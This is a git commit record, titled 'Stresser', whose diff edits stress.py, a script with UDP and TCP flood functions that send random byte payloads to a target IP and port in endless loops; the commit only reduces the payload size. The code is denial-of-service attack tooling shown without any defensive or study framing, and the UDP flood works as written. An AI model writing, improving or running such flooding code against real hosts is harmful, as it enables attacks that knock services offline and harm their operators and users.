2655a5da8936279062a515fdee3ad180d8ac6442
MuxTeam <minegamer30k@gmail.com>
2026-02-26 01:07:40 +0200

    Stresser

--- stress.py
+++ stress.py
@@ -5,14 +5,14 @@ import threading
 
 def udpflood(ip, port):
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-  raw = os.urandom(1200)
+  raw = os.urandom(1024)
   payload = b'\xfe' + raw
   while True:
     s.sendto(payload, (ip, port))
 
 def tcpflood(ip, port):
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  raw = os.urandom(1200)
+  raw = os.urandom(1024)
   while True:
     s.connect((ip, port))
     s.send(raw)
